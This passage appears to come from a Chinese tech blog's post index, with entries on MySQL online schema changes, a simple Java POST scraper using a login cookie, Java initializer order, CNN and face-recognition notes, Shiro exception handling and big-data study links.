当产品经理需要扩展属性时，新数据将版本变为1，此时新增了age和sex两个数据，数据变为：优点：（1）可以随时动态扩展属性（2）新旧两种数据可以同时存在（3）迁移数据方便，写个小程序将旧版本ext的改为新版本的ext，并修改version不足：（1）ext里的字段无法建立索引（2）ext里的key值有大量冗余，建议key短一些改进：（1）如果ext里的属性有索引需求，可能Nosql的如MongoDB会更适合 4、通过扩展行的方式来扩展属性以上面的用户表为例，可以设计为user(uid, key, value)初期有name, passwd, nick三个属性，那么数据为： 未来扩展了age和sex两个属性，数据变为：优点：（1）可以随时动态扩展属性（2）新旧两种数据可以同时存在（3）迁移数据方便，写个小程序可以将新增的属性加上（4）各个属性上都可以查询不足：（1）key值有大量冗余，建议key短一些（2）本来一条记录很多属性，会变成多条记录，行数会增加很多 重点：在线表结构变更对于在线表扩展，业内比较成熟的方案是 pt-online-schema-change，即新表 + 触发器 + 迁移数据 + rename。 我们知道MySQL默认 online ddl 的原理如下：（1）创建一个和原来表结构一样的临时表并ddl（2）锁住原表，所有数据都无法写入（insert,update,delete）（3）将原表数据写入到临时表中（通过insert …select方式）（4）写入完后，重命名临时表和原表名称（5）删除原表，释放锁如果表非常大的话，以上的锁表时间之长是无法忍受的。 以user(uid, name, passwd)扩展到user(uid, name, passwd, age, sex)为例 pt-online-schema-change 的原理如下：（1）先创建一个扩充字段后的新表user_new(uid, name, passwd, age, sex)（2）在原表user上创建三个触发器，对原表user进行的所有insert/delete/update操作，都会对新表user_new进行相同的操作（3）分批将原表user中的数据insert到新表user_new，直至数据迁移完成（4）删掉触发器，把原表移走（默认是drop掉）（5）把新表user_new重命名（rename）成原表user扩充字段完成。 优点：整个过程不需要锁表，可以持续对外提供服务 操作注意事项：（1）变更过程中，最重要的是冲突的处理，一条原则，以触发器的新数据为准，这就要求被迁移的表必须有主键（这个要求基本都满足）（2）变更过程中，写操作需要建立触发器，所以如果原表已经有很多触发器，方案就不行（互联网大数据高并发的在线业务，一般都禁止使用触发器）（3）触发器的建立，会影响原表的性能，所以这个操作建议在流量低峰期进行 pt-online-schema-change 是DBA必备的利器，比较成熟，在互联网公司使用广泛。","link":"/2017/05/02/%E4%BB%8E%E8%A1%A8%E6%89%A9%E5%B1%95%E5%A2%9E%E5%8A%A0%E5%88%97%E5%B1%9E%E6%80%A7%E8%AF%B4%E8%B5%B7/"},{"title":"使用Post方法模拟登陆爬取网页","text":"最近弄爬虫，遇到的一个问题就是如何使用post方法模拟登陆爬取网页。下面是极简版的代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374import java.io.BufferedReader;import java.io.InputStreamReader;import java.io.OutputStreamWriter;import java.io.PrintWriter;import java.net.HttpURLConnection;import java.net.URL;import java.util.HashMap;public class test { //post请求地址 private static final String POST_URL = \"\"; //模拟谷歌浏览器请求 private static final String USER_AGENT = \"\"; //用账号登录某网站后 请求POST_URL链接获取cookie private static final String COOKIE = \"\"; //用账号登录某网站后 请求POST_URL链接获取数据包 private static final String REQUEST_DATA = \"\"; public static void main(String[] args) throws Exception { HashMap&lt;String, String&gt; map = postCapture(REQUEST_DATA); String responseCode = map.get(\"responseCode\"); String value = map.get(\"value\"); while(!responseCode.equals(\"200\")){ map = postCapture(REQUEST_DATA); responseCode = map.get(\"responseCode\"); value = map.get(\"value\"); } //打印爬取结果 System.out.println(value); } private static HashMap&lt;String, String&gt; postCapture(String requestData) throws Exception{ HashMap&lt;String, String&gt; map = new HashMap&lt;&gt;(); URL url = new URL(POST_URL); HttpURLConnection httpConn = (HttpURLConnection) url.openConnection(); httpConn.setDoInput(true); // 设置输入流采用字节流 httpConn.setDoOutput(true); // 设置输出流采用字节流 httpConn.setUseCaches(false); //设置缓存 httpConn.setRequestMethod(\"POST\");//POST请求 httpConn.setRequestProperty(\"User-Agent\", USER_AGENT); httpConn.setRequestProperty(\"Cookie\", COOKIE); PrintWriter out = new PrintWriter(new OutputStreamWriter(httpConn.getOutputStream(), \"UTF-8\")); out.println(requestData); out.close(); int responseCode = httpConn.getResponseCode(); StringBuffer buffer = new StringBuffer(); if (responseCode == 200) { BufferedReader reader = new BufferedReader(new InputStreamReader(httpConn.getInputStream(), \"UTF-8\")); String line = null; while ((line = reader.readLine()) != null) { buffer.append(line); } reader.close(); httpConn.disconnect(); } map.put(\"responseCode\", new Integer(responseCode).toString()); map.put(\"value\", buffer.toString()); return map; }}","link":"/2016/04/19/%E4%BD%BF%E7%94%A8Post%E6%96%B9%E6%B3%95%E6%A8%A1%E6%8B%9F%E7%99%BB%E9%99%86%E7%88%AC%E5%8F%96%E7%BD%91%E9%A1%B5/"},{"title":"初始化块和静态初始化块的区别","text":"初始化块和静态初始化块的内容总是傻傻分不清，今天特意整理了下。大家可以不看文章前面内容，先试试最后的那道测试题。 测试代码1、static初始化块static初始化块是在构造函数之前执行的，而且只执行一次，即类首次加载时。 测试代码： 2、初始化块&lt;(￣︶￣)&gt;测试代码： 原代码：1234567891011121314151617181920212223242526272829303132333435package dem;public class A extends B { public A() { System.out.println(&quot;A构造方法&quot;); } static { System.out.println(&quot;A静态初始化块&quot;); } { System.out.println(&quot;A初始化块&quot;); } public static void main(String[] args) { new A(); System.out.println(&quot;--------&quot;); new A(); }}class B { public B() { System.out.println(&quot;B构造方法&quot;); } static { System.out.println(&quot;B静态初始化块&quot;); } { System.out.println(&quot;B初始化块&quot;); }}","link":"/2016/06/06/%E5%88%9D%E5%A7%8B%E5%8C%96%E5%9D%97%E5%92%8C%E9%9D%99%E6%80%81%E5%88%9D%E5%A7%8B%E5%8C%96%E5%9D%97%E7%9A%84%E5%8C%BA%E5%88%AB/"},{"title":"人脸识别","text":"简介人脸验证（Face Verification）和人脸识别（Face Recognition）的区别： 人脸验证：一般指一个一对一问题，只需要验证输入的人脸图像是否与某个已知的身份信息对应； 人脸识别：一个更为复杂的一对多问题，需要验证输入的人脸图像是否与多个已知身份信息中的某一个匹配。 一般来说，由于需要匹配的身份信息更多导致错误率增加，人脸识别比人脸验证更难一些。 相关链接： 代码示例 A Face Detection Benchmark One-Shot 学习人脸识别所面临的一个挑战是要求系统只采集某人的一个面部样本，就能快速准确地识别出这个人，即只用一个训练样本来获得准确的预测结果。这被称为One-Shot 学习。 有一种方法是假设数据库中存有 N 个人的身份信息，对于每张输入图像，用 Softmax 输出 N+1 种标签，分别对应每个人以及都不是。然而这种方法的实际效果很差，因为过小的训练集不足以训练出一个稳健的神经网络；并且如果有新的身份信息入库，需要重新训练神经网络，不够灵活。 因此，我们通过学习一个 Similarity 函数来实现 One-Shot 学习过程。Similarity 函数定义了输入的两幅图像的差异度，其公式如下： Similarity = d(img1, img2)可以设置一个超参数 τ 作为阈值，作为判断两幅图片是否为同一个人的依据。 Siamese 孪生网络实现 Similarity 函数的一种方式是使用Siamese 网络，它是一种对两个不同输入运行相同的卷积网络，然后对它们的结果进行比较的神经网络。 如上图示例，将图片 $x^{(1)}$、$x^{(2)}$ 分别输入两个相同的卷积网络中，经过全连接层后不再进行 Softmax，而是得到特征向量 $f(x^{(1)})$、$f(x^{(2)})$。这时，Similarity 函数就被定义为两个特征向量之差的 L2 范数： d(x^{(1)}, x^{(2)}) = ||f(x^{(1)}) - f(x^{(2)})||^2_2孪生网络05年由Lecun提出，15年做了改进。2-branches networks ==&gt; 2-channel networks。siamese(孪生) 网络简介：http://blog.csdn.net/qq_15192373/article/details/78404761 相关论文：Taigman et al., 2014, DeepFace closing the gap to human level performance Triplet 损失Triplet 损失函数用于训练出合适的参数，以获得高质量的人脸图像编码。“Triplet”一词来源于训练这个神经网络需要大量包含 Anchor（靶目标）、Positive（正例）、Negative（反例）的图片组，其中 Anchor 和 Positive 需要是同一个人的人脸图像。 对于这三张图片，应该有： ||f(A) - f(P)||^2_2 + \\alpha \\le ||f(A) - f(N)||^2_2其中，α 被称为间隔（margin），用于确保 f() 不会总是输出零向量（或者一个恒定的值）。 Triplet 损失函数的定义： L(A, P, N) = max(||f(A) - f(P)||^2_2 - ||f(A) - f(N)||^2_2 + \\alpha, 0)其中，因为 $||f(A) - f(P)||^2_2 - ||f(A) - f(N)||^2_2 + \\alpha$ 的值需要小于等于 0，因此取它和 0 的更大值。 对于大小为 m 的训练集，代价函数为： J = \\sum^m_{i=1}L(A^{(i)}, P^{(i)}, N^{(i)})通过梯度下降最小化代价函数。 在选择训练样本时，随机选择容易使 Anchor 和 Positive 极为接近，而 Anchor 和 Negative 相差较大，以致训练出来的模型容易抓不到关键的区别。因此，最好的做法是人为增加 Anchor 和 Positive 的区别，缩小 Anchor 和 Negative 的区别，促使模型去学习不同人脸之间的关键差异。 相关论文：Schroff et al., 2015, FaceNet: A unified embedding for face recognition and clustering 二分类结构除了 Triplet 损失函数，二分类结构也可用于学习参数以解决人脸识别问题。其做法是输入一对图片，将两个 Siamese 网络产生的特征向量输入至同一个 Sigmoid 单元，输出 1 则表示是识别为同一人，输出 0 则表示识别为不同的人。 Sigmoid 单元对应的表达式为： \\hat y = \\sigma (\\sum^K_{k=1}w_k|f(x^{(i)})_{k} - x^{(j)})_{k}| + b)其中，wk 和 b 都是通过梯度下降算法迭代训练得到的参数。上述计算表达式也可以用另一种表达式代替： \\hat y = \\sigma (\\sum^K_{k=1}w_k \\frac{(f(x^{(i)})_k - f(x^{(j)})_k)^2}{f(x^{(i)})_k + f(x^{(j)})_k} + b)其中，\\frac{(f(x^{(i)})_k - f(x^{(j)})_k)^2}{f(x^{(i)})_k + f(x^{(j)})_k} 被称为 $χ$ 方相似度。 无论是对于使用 Triplet 损失函数的网络，还是二分类结构，为了减少计算量，可以提前计算好编码输出 f(x) 并保存。这样就不必存储原始图片，并且每次进行人脸识别时只需要计算测试图片的编码输出。","link":"/2018/01/21/%E4%BA%BA%E8%84%B8%E8%AF%86%E5%88%AB/"},{"title":"卷积操作详解（填充、步长、高维卷积、卷积公式）","text":"对图像（不同的数据窗口数据）和滤波矩阵（一组固定的权重：因为每个神经元的多个权重固定，所以又可以看做一个恒定的滤波器filter）做内积（逐个元素相乘再求和）的操作就是所谓的『卷积』操作，也是卷积神经网络的名字来源。 填充假设输入图片的大小为 n×n，而滤波器的大小为 f×f，则卷积后的输出图片大小为 (n−f+1)×(n−f+1)。 这样就有两个问题： 每次卷积运算后，输出图片的尺寸缩小； 原始图片的角落、边缘区像素点在输出中采用较少，输出图片丢失边缘位置的很多信息。 为了解决这些问题，可以在进行卷积操作前，对原始图片在边界上进行填充（Padding），以增加矩阵的大小。通常将 0 作为填充值。 设每个方向扩展像素点数量为 p，则填充后原始图片的大小为 **(n+2p)×(n+2p)$，滤波器大小保持 $f×f$不变，则输出图片大小为 $(n+2p−f+1)×(n+2p−f+1)$。 因此，在进行卷积运算时，我们有两种选择： Valid 卷积：不填充，直接卷积。结果大小为 $(n−f+1)×(n−f+1)$； Same 卷积：进行填充，并使得卷积后结果大小与输入一致，这样 $p = \\frac{f-1}{2}$。 在计算机视觉领域，f通常为奇数。原因包括 Same 卷积中 $p = \\frac{f-1}{2}$ 能得到自然数结果，并且滤波器有一个便于表示其所在位置的中心点。 卷积步长卷积过程中，有时需要通过填充来避免信息损失，有时也需要通过设置步长（Stride）来压缩一部分信息。 步长表示滤波器在原始图片的水平方向和垂直方向上每次移动的距离。之前，步长被默认为 1。而如果我们设置步长为 2，则卷积过程如下图所示： 设步长为 s，填充长度为 p，输入图片大小为 n×n，滤波器大小为 f×f，则卷积后图片的尺寸为： \\biggl\\lfloor \\frac{n+2p-f}{s}+1 \\biggr\\rfloor \\times \\biggl\\lfloor \\frac{n+2p-f}{s}+1 \\biggr\\rfloor注意公式中有一个向下取整的符号，用于处理商不为整数的情况。向下取整反映着当取原始矩阵的图示蓝框完全包括在图像内部时，才对它进行运算。 目前为止我们学习的“卷积”实际上被称为互相关（cross-correlation），而非数学意义上的卷积。真正的卷积操作在做元素乘积求和之前，要将滤波器沿水平和垂直轴翻转（相当于旋转 180 度）。因为这种翻转对一般为水平或垂直对称的滤波器影响不大，按照机器学习的惯例，我们通常不进行翻转操作，在简化代码的同时使神经网络能够正常工作。 高维卷积如果我们想要对三通道的 RGB 图片进行卷积运算，那么其对应的滤波器组也同样是三通道的。过程是将每个单通道（R，G，B）与对应的滤波器进行卷积运算求和，然后再将三个通道的和相加，将 27 个乘积的和作为输出图片的一个像素值。 不同通道的滤波器可以不相同。例如只检测 R 通道的垂直边缘，G 通道和 B 通道不进行边缘检测，则 G 通道和 B 通道的滤波器全部置零。当输入有特定的高、宽和通道数时，滤波器可以有不同的高和宽，但通道数必须和输入一致。 如果想同时检测垂直和水平边缘，或者更多的边缘检测，可以增加更多的滤波器组。例如设置第一个滤波器组实现垂直边缘检测，第二个滤波器组实现水平边缘检测。设输入图片的尺寸为 $n×n×nc$（nc为通道数），滤波器尺寸为 $f×f×nc$，则卷积后的输出图片尺寸为 $(n−f+1)×(n−f+1)×n′c$，$n′c$为滤波器组的个数。 单层卷积网络 与之前的卷积过程相比较，卷积神经网络的单层结构多了激活函数和偏移量；而与标准神经网络： Z^{[l]} = W^{[l]}A^{[l-1]}+bA^{[l]} = g^{[l]}(Z^{[l]})相比，滤波器的数值对应着权重 $W[l]$，卷积运算对应着 $W[l]$与 $A[l−1]$的乘积运算，所选的激活函数变为 ReLU。 对于一个 3x3x3 的滤波器，包括偏移量 b在内共有 28 个参数。不论输入的图片有多大，用这一个滤波器来提取特征时，参数始终都是 28 个，固定不变。即选定滤波器组后，参数的数目与输入图片的尺寸无关。因此，卷积神经网络的参数相较于标准神经网络来说要少得多。这是 CNN 的优点之一。 符号总结设 $l$ 层为卷积层： $f^{[l]}$：滤波器的高（或宽） $p^{[l]}$：填充长度 $s^{[l]}$：步长 $n^{[l]}_c$：滤波器组的数量 输入维度：$n^{[l-1]}_H \\times n^{[l-1]}_W \\times n^{[l-1]}_c$ 。其中 $n^{[l-1]}_H$表示输入图片的高，$n^{[l-1]}_W$表示输入图片的宽。之前的示例中输入图片的高和宽都相同，但是实际中也可能不同，因此加上下标予以区分。 输出维度：$n^{[l]}_H \\times n^{[l]}_W \\times n^{[l]}_c$ 。其中 n^{[l]}_H = \\biggl\\lfloor \\frac{n^{[l-1]}_H+2p^{[l]}-f^{[l]}}{s^{[l]}}+1 \\biggr\\rfloorn^{[l]}_W = \\biggl\\lfloor \\frac{n^{[l-1]}_W+2p^{[l]}-f^{[l]}}{s^{[l]}}+1 \\biggr\\rfloor每个滤波器组的维度：$f^{[l]} \\times f^{[l]} \\times n^{[l-1]}_c$ 。其中 $n^{[l-1]}_c$ 为输入图片通道数（也称深度）。权重维度：$f^{[l]} \\times f^{[l]} \\times n^{[l-1]}_c \\times n^{[l]}_c$偏置维度：$1 \\times 1 \\times 1 \\times n^{[l]}_c$ 由于深度学习的相关文献并未对卷积标示法达成一致，因此不同的资料关于高度、宽度和通道数的顺序可能不同。有些作者会将通道数放在首位，需要根据标示自行分辨。","link":"/2018/01/10/%E5%8D%B7%E7%A7%AF%E6%93%8D%E4%BD%9C%E8%AF%A6%E8%A7%A3%EF%BC%88%E5%A1%AB%E5%85%85%E3%80%81%E6%AD%A5%E9%95%BF%E3%80%81%E9%AB%98%E7%BB%B4%E5%8D%B7%E7%A7%AF%E3%80%81%E5%8D%B7%E7%A7%AF%E5%85%AC%E5%BC%8F%EF%BC%89/"},{"title":"卷积网络的边缘检测","text":"神经网络由浅层到深层，分别可以检测出图片的边缘特征、局部特征（例如眼睛、鼻子等），到后面的一层就可以根据前面检测的特征来识别整体面部轮廓。这些工作都是依托卷积神经网络来实现的。 卷积运算（Convolutional Operation）是卷积神经网络最基本的组成部分。我们以边缘检测为例，来解释卷积是怎样运算的。 边缘检测图片最常做的边缘检测有两类：垂直边缘（Vertical Edges）检测和水平边缘（Horizontal Edges）检测。 图片的边缘检测可以通过与相应滤波器进行卷积来实现。以垂直边缘检测为例，原始图片尺寸为 6x6，中间的矩阵被称作滤波器（filter），尺寸为 3x3，卷积后得到的图片尺寸为 4x4，得到结果如下（数值表示灰度，以左上角和右下角的值为例）： 可以看到，卷积运算的求解过程是从左到右，由上到下，每次在原始图片矩阵中取与滤波器同等大小的一部分，每一部分中的值与滤波器中的值对应相乘后求和，将结果组成一个矩阵。 下图对应一个垂直边缘检测的例子： 如果将最右边的矩阵当作图像，那么中间一段亮一些的区域对应最左边的图像中间的垂直边缘。 这里有另一个卷积运算的动态的例子，方便理解： 图中的*表示卷积运算符号。因为在计算机中这个符号表示一般的乘法，在不同的深度学习框架中，卷积操作的 API 定义可能不同： 在 Python 中，卷积用 conv_forward() 表示；在 Tensorflow 中，卷积用 tf.nn.conv2d() 表示；在 keras 中，卷积用 Conv2D() 表示。 更多边缘检测的例子如果将灰度图左右的颜色进行翻转，再与之前的滤波器进行卷积，得到的结果也有区别。实际应用中，这反映了由明变暗和由暗变明的两种渐变方式。可以对输出图片取绝对值操作，以得到同样的结果。 垂直边缘检测和水平边缘检测的滤波器如下所示： 其他常用的滤波器还有 Sobel 滤波器和 Scharr 滤波器。它们增加了中间行的权重，这样可能更加稳健。 滤波器中的值还可以设置为参数，通过模型训练来得到。这样，神经网络使用反向传播算法可以学习到一些低级特征，从而实现对图片所有边缘特征的检测，而不仅限于垂直边缘和水平边缘。","link":"/2017/12/18/%E5%8D%B7%E7%A7%AF%E7%BD%91%E7%BB%9C%E7%9A%84%E8%BE%B9%E7%BC%98%E6%A3%80%E6%B5%8B/"},{"title":"吴恩达2014机器学习教程笔记目录","text":"17年开始，网上的机器学习教程逐渐增多，国内我所了解的就有网易云课堂、七月、小象学院和北风。他们的课程侧重点各有不同，有些侧重理论，有些侧重实践，结合起来学习事半功倍。但是论经典，还是首推吴恩达的机器学习课程。 吴大大14年在coursera的课程通俗易懂、短小精悍，在讲解知识点的同时，还会穿插相关领域的最新动态，并向你推荐相关论文。课程10周共18节课，每个课程都有PPT和课后习题，当然，也有中文字幕。 百度网盘（视频 + 英文字幕 + 中文字幕 + 练习 + PPT）:链接：https://pan.baidu.com/s/1ggWjzFH 密码：bk1g 第一周 一、 引言(Introduction)1.1 欢迎1.2 机器学习是什么？1.3 监督学习1.4 无监督学习 二、单变量线性回归(Linear Regression with One Variable)2.1 模型表示2.2 代价函数2.3 代价函数的直观理解I2.4 代价函数的直观理解II2.5 梯度下降2.6 梯度下降的直观理解2.7 梯度下降的线性回归2.8 接下来的内容 三、线性代数回顾(Linear Algebra Review)3.1 矩阵和向量3.2 加法和标量乘法3.3 矩阵向量乘法3.4 矩阵乘法3.5 矩阵乘法的性质3.6 逆、转置 第二周 四、多变量线性回归(Linear Regression with Multiple Variables)4.1 多维特征4.2 多变量梯度下降4.3 梯度下降法实践1-特征缩放4.4 梯度下降法实践2-学习率4.5 特征和多项式回归4.6 正规方程4.7 正规方程及不可逆性（选修） 五、Octave教程(Octave Tutorial)5.1 基本操作5.2 移动数据5.3 计算数据5.4 绘图数据5.5 控制语句：for，while，if语句5.6 向量化 885.7 工作和提交的编程练习 第三周 六、逻辑回归(Logistic Regression)6.1 分类问题6.2 假说表示6.3 判定边界6.4 代价函数6.5 简化的成本函数和梯度下降6.6 高级优化6.7 多类别分类：一对多 七、正则化(Regularization)7.1 过拟合的问题7.2 代价函数7.3 正则化线性回归7.4 正则化的逻辑回归模型 第四周 第八、神经网络：表述(Neural Networks: Representation)8.1 非线性假设8.2 神经元和大脑8.3 模型表示18.4 模型表示28.5 样本和直观理解18.6 样本和直观理解II8.7 多类分类 第五周 九、神经网络的学习(Neural Networks: Learning)9.1 代价函数9.2 反向传播算法9.3 反向传播算法的直观理解9.4 实现注意：展开参数9.5 梯度检验9.6 随机初始化9.7 综合起来9.8 自主驾驶 第六周 十、应用机器学习的建议(Advice for Applying Machine Learning)10.1 决定下一步做什么10.2 评估一个假设10.3 模型选择和交叉验证集10.4 诊断偏差和方差10.5 正则化和偏差/方差10.6 学习曲线10.7 决定下一步做什么 十一、机器学习系统的设计(Machine Learning System Design)11.1 首先要做什么11.2 误差分析11.3 类偏斜的误差度量11.4 查准率和查全率之间的权衡11.5 机器学习的数据 第7周 十二、支持向量机(Support Vector Machines)12.1 优化目标12.2 大边界的直观理解12.3 数学背后的大边界分类（选修）12.4 核函数112.5 核函数212.6 使用支持向量机 第八周 十三、聚类(Clustering)13.1 无监督学习：简介13.2 K-均值算法13.3 优化目标13.4 随机初始化13.5 选择聚类数 十四、降维(Dimensionality Reduction)14.1 动机一：数据压缩14.2 动机二：数据可视化14.3 主成分分析问题14.4 主成分分析算法14.5 选择主成分的数量14.6 重建的压缩表示14.7 主成分分析法的应用建议 第九周 十五、异常检测(Anomaly Detection)15.1 问题的动机15.2 高斯分布15.3 算法15.4 开发和评价一个异常检测系统15.5 异常检测与监督学习对比15.6 选择特征15.7 多元高斯分布（选修）15.8 使用多元高斯分布进行异常检测（选修） 十六、推荐系统(Recommender Systems)16.1 问题形式化16.2 基于内容的推荐系统16.3 协同过滤16.4 协同过滤算法16.5 向量化：低秩矩阵分解16.6 推行工作上的细节：均值归一化 第十周 十七、大规模机器学习(Large Scale Machine Learning)17.1 大型数据集的学习17.2 随机梯度下降法17.3 小批量梯度下降17.4 随机梯度下降收敛17.5 在线学习17.6 映射化简和数据并行 十八、应用实例：图片文字识别(Application Example: Photo OCR)18.1 问题描述和流程图18.2 滑动窗口18.3 获取大量数据和人工数据18.4 上限分析：哪部分管道的接下去做 十九、总结(Conclusion)","link":"/2017/10/16/%E5%90%B4%E6%81%A9%E8%BE%BE2014%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E6%95%99%E7%A8%8B%E7%AC%94%E8%AE%B0%E7%9B%AE%E5%BD%95/"},{"title":"吴恩达2017深度学习课后作业笔记","text":"持续整理中。。。 链接地址 吴恩达深度学习视频教程 教程对应的课后作业 再推荐一个优秀的 博客，关于吴恩达深度学习视频总结的。 课后作业目录1_神经网络与深度学习…………Week1 深度学习概论……………………选择题…………Week2 神经网络基础……………………assignment2_1……………………assignment2_2…………Week3 浅层神经网络……………………assignment3…………Week4 深层神经网络……………………assignment4_1……………………assignment4_2 2_改善深层神经网络：超参数调试、正则化以及优化…………Week1 深层学习的实用……………………Initialization……………………Regularization……………………Gradient_Checking…………Week2 优化算法……………………Optimization+methods…………Week3 超参数调试&amp;正则化&amp;框架……………………Tensorflow+Tutorial 3结构化机器学习项目…………[选择题1](http://7xvfir.com1.z0.glb.clouddn.com/%E5%90%B4%E6%81%A9%E8%BE%BE%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E8%AF%BE%E5%90%8E%E4%BD%9C%E4%B8%9A/%E7%AC%AC%E4%B8%89%E8%AF%BE%E7%BB%93%E6%9E%84%E5%8C%96%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E5%90%8E%E4%BD%9C%E4%B8%9A_1.png)…………[选择题2](http://7xvfir.com1.z0.glb.clouddn.com/%E5%90%B4%E6%81%A9%E8%BE%BE%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E8%AF%BE%E5%90%8E%E4%BD%9C%E4%B8%9A/%E7%AC%AC%E4%B8%89%E8%AF%BE%E7%BB%93%E6%9E%84%E5%8C%96%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0_%E8%AF%BE%E5%90%8E%E4%BD%9C%E4%B8%9A_2.png)…………总结 4_卷积神经网络…………Week1 卷积神经网络……………………Convolution model-Application-v1……………………Convolution model-Step by Step-v1……………………Convolution model-Step by Step-v2…………Week2 深层卷积神经网络实例探究…………Week3 目标检测…………Week4 特殊的应用 Initialization_神经网络权重初始化现在有一个三层的神经网络，需要用不同的方式去初始化它的权重W和b，然后查看它的分类效果。 精心选择的初始化可以：1）加快梯度下降的收敛2）增加梯度下降收敛到较低的训练（和泛化）错误的几率 这里尝试了三种初始化方法1）Zeros initialization，参数全部初始化为0。2）Random initialization，参数随机初始化，并初始化为较大的随机值。3）He initialization，权重的初始化参考了He等人在2015年发表的论文。 Zeros initialization：分类效果非常差，因为将所有权重初始化为零将无法破坏网络的对称性。这意味着每一层的每个神经元都会学到相同的东西，这样的神经元网络并不比线性分类器如逻辑回归更强大。 需要注意的是，需要初始化去破坏网络对称性(symmetry)的只有W，b可以全部初始化为0。 Random initialization：随机初始化权重打破了网络的对称性，每个神经元可以根据不同的输入学习不同的功能。示例中显示，过大的随机数初始化效果不佳，会减慢优化速度。用小的随机值进行初始化效果会更好，但重要的问题是这些随机值应该小到多少？可以尝试 He initialization。 He initialization：He等人在2015年的论文中提到，如果你的图层是用ReLU激活的。初始化可以用$\\sqrt{\\frac{2}{\\text{dimension of the previous layer}}}$代替随机初始化中的np.random.randn(..,..)*10。 三种初始化对比结果 三种初始化的结论：1）不同的初始化导致不同的结果2）随机初始化用于破坏对称性，并确保不同的隐藏单元可以学习不同的东西3）不要初始化太大的值4）”He initialization”适用于ReLU激活的网络 相关代码：12345678parameters['W' + str(l)] = np.zeros((layers_dims[l], layers_dims[l-1]))parameters['b' + str(l)] = 0parameters['W' + str(l)] = np.random.randn(layers_dims[l], layers_dims[l-1]) * 10parameters['b' + str(l)] = np.zeros((layers_dims[l],1))parameters['W' + str(l)] = np.random.randn(layers_dims[l], layers_dims[l-1]) * np.sqrt(2/layers_dims[l-1])parameters['b' + str(l)] = np.zeros((layers_dims[l],1))","link":"/2017/12/18/%E5%90%B4%E6%81%A9%E8%BE%BE2017%E6%B7%B1%E5%BA%A6%E5%AD%A6%E4%B9%A0%E8%AF%BE%E5%90%8E%E4%BD%9C%E4%B8%9A%E7%AC%94%E8%AE%B0/"},{"title":"外部无法捕捉Realm的doGetAuthenticationInfo方法抛出的异常","text":"shiro权限框架，用户登录方法的subject.login(token)会进入自定义的UserNamePasswordRealm类的doGetAuthenticationInfo身份验证方法 通常情况，doGetAuthenticationInfo写法如下： 12345678910111213@Overrideprotected AuthenticationInfo doGetAuthenticationInfo(AuthenticationToken authcToken) throws AuthenticationException { UsernamePasswordToken token = (UsernamePasswordToken) authcToken; User loginUser = userService.getUserByName(token.getUsername()); if (ObjectUtils.isEmpty(loginUser)) { throw new UnknownAccountException(); } if(!loginUser.getPassWord().equals(MD5Util.md5s(String.valueOf(token.getPassword())))){ throw new IncorrectCredentialsException(); } //其他各种验证 。。。} login登录方法：123456789101112131415161718192021@ResponseBody@RequestMapping(value = \"/login\", method = RequestMethod.POST)public String doUserLogin(User user, HttpServletRequest request, Model model) { ... Subject subject = SecurityUtils.getSubject(); UsernamePasswordToken token = new UsernamePasswordToken(user.getUserName(), user.getPassWord()); try { subject.login(token); } catch (UnknownAccountException uae) { } catch (IncorrectCredentialsException ice) { } catch (LockedAccountException lae) { } catch (ExcessiveAttemptsException eae) { } catch (AuthenticationException ae) { } ...} 可是最近一次项目，发现通用的方法行不通了，doGetAuthenticationInfo方法抛出的各种异常如UnknownAccountException(包括自定义的异常)，外部都无法准确捕捉。 外部login捕捉的异常统一被改写为 AuthenticationException异常(IncorrectCredentialsException等异常的父类)，且异常的msg内容也被改写。内容如下： 原因在subject.login(token)的源码里，源码有这么一段： 我们进入doSingleRealmAuthentication方法，可以看见方法里面外抛了UnknownAccountException等异常。所以如果项目中只定义了一个realm，比如用来进行登录的身份验证，外部是可以正常捕捉的。 但是此次项目我定义了两个realm，一个用来进行登录的身份验证，另一个用来登录后，验证各种请求携带的的token。我们进入doMultiRealmAuthentication方法，内容如下 再进入afterAllAttempts的实现类，如图5。发现抛出的异常都被统一改为AuthenticationException异常，且msg也被改写，正如图1所示。 结论外部无法捕捉doGetAuthenticationInfo方法抛出的异常，原因在于源码，而不是自己的代码有问题。如果没有改写源码的本事，那么外部想要捕捉各种异常，并在前端显示各种提示语，怎么办？ 我的临时解决方法是，doGetAuthenticationInfo只用来验证用户名和密码，外部直接捕捉AuthenticationException异常，其他的各种验证从doGetAuthenticationInfo方法移至login。","link":"/2016/09/19/%E5%A4%96%E9%83%A8%E6%97%A0%E6%B3%95%E6%8D%95%E6%8D%89Realm%E7%9A%84doGetAuthenticationInfo%E6%96%B9%E6%B3%95%E6%8A%9B%E5%87%BA%E7%9A%84%E5%BC%82%E5%B8%B8/"},{"title":"大数据学习资料共享","text":"链接相关大数据学习论坛：http://www.aboutyun.com/吴超hadoop视频教程全套：http://pan.baidu.com/s/1dELRREh 密码：765z炼数成金hadoop视频：http://pan.baidu.com/s/1bKCj6Y 密码：55zy 图片相关","link":"/2017/02/08/%E5%A4%A7%E6%95%B0%E6%8D%AE%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99%E5%85%B1%E4%BA%AB/"},{"title":"大数据进阶计划","text":"最近看了一篇文章，里面认为大数据学习有以下几个步骤 初识Hadoop 更高效的WordCount 把别处的数据搞到Hadoop上 把Hadoop上的数据搞到别处去 快一点吧，我的SQL 一夫多妻制 越来越多的分析任务 我的数据要实时 我的数据要对外 牛逼高大上的机器学习 15年曾自学走到第六步，装了一大推软件，跑了一堆数据。可惜当时只保存了学习资料和一堆杂乱无章的笔记，没有整理成脚本和文章。现想捡回以前的知识，并进阶学习，又得从头开始，悔不当初。 整理当初的大数据学习资料（视频、ppt、代码和安装包等），链接如下（密码短期之内不会修改）: 大数据学习论坛：http://www.aboutyun.com/ 吴超hadoop视频教程全套：http://pan.baidu.com/s/1kUQP3cN 提取密码：a49u 炼数成金hadoop视频：http://pan.baidu.com/s/1i5Es83V 提取密码：vnw7 大数据资料集锦：http://pan.baidu.com/s/1c1AOI4K 提取密码：ufgs 